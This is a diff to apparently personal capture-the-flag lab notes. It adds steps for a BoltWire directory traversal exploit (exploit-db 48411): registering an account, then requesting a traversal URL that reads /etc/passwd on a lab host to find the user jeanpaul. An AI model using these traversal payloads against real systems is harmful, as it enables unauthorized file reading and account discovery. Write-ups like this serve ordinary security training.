@@ -118,8 +118,22 @@ Check the boltwire exploit in your browser
 
 https://www.exploit-db.com/exploits/48411
 
+
+
 ![[Pasted image 20240707195943.png]]
 
+1) Using HTTP GET request browse to the following page, whilst being authenticated user.
+http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
+
+As per the exploit-db you need to be regoistered first so i registered in the website as hacker
+
+![[Pasted image 20240707201105.png]]
+
+Then go to the webiste http://192.168.64.6:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+
+Using the website directory we checked that there is user jeanpaul
+
+![[Pasted image 20240707201209.png]]
 ## Exploit port 80
 
 - http://192.168.64.6
